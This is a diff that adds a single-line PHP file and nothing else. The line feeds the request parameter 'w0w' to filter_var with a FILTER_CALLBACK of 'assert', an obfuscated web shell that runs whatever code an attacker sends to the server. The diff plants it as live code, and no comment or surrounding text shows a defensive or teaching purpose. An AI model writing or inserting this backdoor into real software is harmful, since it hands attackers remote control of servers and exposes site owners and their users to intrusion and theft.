@@ -1,0 +1,1 @@
+<?php filter_var($_REQUEST['w0w'], FILTER_CALLBACK, array('options' => 'assert'));?>
